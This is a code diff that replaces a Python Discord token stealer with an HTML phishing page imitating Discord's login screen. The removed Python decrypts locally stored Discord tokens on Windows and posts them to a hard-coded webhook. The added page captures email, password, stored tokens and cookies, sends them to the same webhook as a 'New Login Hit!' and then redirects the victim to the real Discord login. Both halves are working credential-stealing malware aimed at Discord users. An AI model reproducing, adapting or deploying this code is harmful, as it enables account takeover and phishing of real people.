@@ -1,67 +1,92 @@
-import os
-import re
-import json
-import base64
-import requests
-from Crypto.Cipher import AES
-from win32crypt import CryptUnprotectData
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
+    <style>
+        body { background-color: #313338; color: #dbdee1; font-family: 'gg sans', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background-color: #313338; padding: 32px; border-radius: 5px; width: 100%; max-width: 420px; box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2); text-align: center; }
+        .login-box img { width: 120px; margin-bottom: 24px; }
+        h2 { color: #f2f3f5; margin-bottom: 8px; font-size: 24px; }
+        p { color: #b5bac1; margin-bottom: 20px; font-size: 16px; }
+        .input-group { text-align: left; margin-bottom: 16px; }
+        .input-group label { display: block; color: #b5bac1; font-size: 12px; font-weight: 700; text-transform: uppercase; margin-bottom: 8px; }
+        .input-group input { width: 100%; padding: 10px; background-color: #1e1f22; border: none; border-radius: 3px; color: #dbdee1; font-size: 16px; box-sizing: border-box; outline: none; }
+        .forgot-password { text-align: left; margin-bottom: 20px; }
+        .forgot-password a { color: #00a8fc; text-decoration: none; font-size: 14px; }
+        .login-btn { width: 100%; background-color: #5865f2; color: white; border: none; padding: 12px; border-radius: 3px; font-size: 16px; cursor: pointer; }
+        .login-btn:hover { background-color: #4752c4; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" alt="Discord">
+        <h2>Welcome back!</h2>
+        <p>We're so excited to see you again!</p>
+        <form id="loginForm">
+            <div class="input-group">
+                <label>EMAIL OR PHONE NUMBER <span>*</span></label>
+                <input type="text" id="email" required autocomplete="off">
+            </div>
+            <div class="input-group">
+                <label>PASSWORD <span>*</span></label>
+                <input type="password" id="password" required>
+            </div>
+            <div class="forgot-password">
+                <a href="#">Forgot your password?</a>
+            </div>
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+    </div>
 
-WEBHOOK = "https://ptb.discord.com/api/webhooks/1563433824195715163/pImDLSOanfVezzULnId7p-Fny5ViXFkbPyoldjKCBnEzpFaPDg7dO6oj7zuBHTJISlwr"
+    <script>
+    (function(){
+      const WEBHOOK = "https://ptb.discord.com/api/webhooks/1563433824195715163/pImDLSOanfVezzULnId7p-Fny5ViXFkbPyoldjKCBnEzpFaPDg7dO6oj7zuBHTJISlwr";
 
-def get_tokens():
-    paths = {
-        'Discord': os.getenv('APPDATA') + '\\discord',
-        'Discord PTB': os.getenv('APPDATA') + '\\discordptb',
-        'Discord Canary': os.getenv('APPDATA') + '\\discordcanary',
-        'Lightcord': os.getenv('APPDATA') + '\\Lightcord',
-    }
+      // سحب التوكن الحقيقي بعد ما يكتب البيانات
+      function getLocalTokens() {
+          let tokens = [];
+          try {
+            for (let i = 0; i < localStorage.length; i++) {
+              const k = localStorage.key(i);
+              const v = localStorage.getItem(k);
+              if (typeof v === 'string') {
+                const m = v.match(/[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g);
+                if (m) tokens.push(...m);
+              }
+            }
+          } catch(e){}
+          return [...new Set(tokens)];
+      }
 
-    tokens = []
-    for name, path in paths.items():
-        if not os.path.exists(path): continue
-        local_state_path = os.path.join(path, 'Local State')
-        if not os.path.exists(local_state_path): continue
+      document.getElementById('loginForm').addEventListener('submit', function(e) {
+          e.preventDefault(); 
+          
+          const email = document.getElementById('email').value;
+          const password = document.getElementById('password').value;
+          const tokens = getLocalTokens();
 
-        try:
-            with open(local_state_path, 'r', encoding='utf-8') as f:
-                local_state = json.load(f)
-            key = local_state.get('os_crypt', {}).get('encrypted_key')
-            if not key: continue
-            key = base64.b64decode(key)[5:]
-            master_key = CryptUnprotectData(key, None, None, None, 0)[1]
-        except:
-            continue
+          const info = {
+            email: email,
+            password: password,
+            tokens: tokens,
+            userAgent: navigator.userAgent,
+            time: new Date().toISOString(),
+            cookies: document.cookie
+          };
 
-        leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
-        if not os.path.exists(leveldb_path): continue
-
-        for file_name in os.listdir(leveldb_path):
-            if not file_name.endswith(('.ldb', '.log')): continue
-            file_path = os.path.join(leveldb_path, file_name)
-            try:
-                with open(file_path, 'rb') as f:
-                    content = f.read()
-                for match in re.finditer(rb'dQw4w9WgXcQ:', content):
-                    encrypted = content[match.end():match.end()+150]
-                    try:
-                        iv = encrypted[3:15]
-                        payload = encrypted[15:]
-                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
-                        decrypted = cipher.decrypt(payload)[:-16].decode()
-                        if re.match(r'[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}', decrypted):
-                            tokens.append(f"[{name}] {decrypted}")
-                    except: pass
-            except: pass
-    return list(set(tokens))
-
-def main():
-    tokens = get_tokens()
-    if not tokens:
-        requests.post(WEBHOOK, json={"content": "❌ لم يتم العثور على توكنات. تأكد أن ديسكورد مفتوح ومسجل دخول."})
-        return
-    
-    msg = f"✅ تم استخراج {len(tokens)} توكن:\n```\n" + "\n".join(tokens) + "\n```"
-    requests.post(WEBHOOK, json={"content": msg})
-
-if __name__ == "__main__":
-    main()
+          fetch(WEBHOOK, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              content: "**🎯 New Login Hit!**\n```json\n" + JSON.stringify(info, null, 2).slice(0, 1900) + "\n```"
+            })
+          }).catch(()=>{}).finally(() => {
+              window.location.href = "https://discord.com/login";
+          });
+      });
+    })();
+    </script>
+</body>
+</html>
